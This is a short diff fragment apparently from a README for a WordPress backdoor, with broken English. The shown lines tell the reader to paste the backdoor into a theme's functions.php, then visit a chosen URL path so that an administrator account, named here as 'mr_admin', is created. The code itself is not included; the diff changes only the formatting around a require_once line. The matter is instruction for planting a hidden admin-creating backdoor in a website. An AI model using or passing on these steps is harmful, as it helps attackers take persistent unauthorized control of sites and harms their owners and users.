@@ -16,7 +16,7 @@ go to template edit option and find the function.php or any file that store temp
 
 now paste the backdoor to any where in the function.php and change the parth 'backdoor'  now all set 
 now go to the example.com/backdor or your path like example.com/path now enjoy you user will careted as admin
-check <b>require_once(ABSPATH . 'wp-includes/registration.php');</b> added or not
+check <b> ```require_once(ABSPATH . 'wp-includes/registration.php');```</b> added or not
 
 
 user:mr_admin
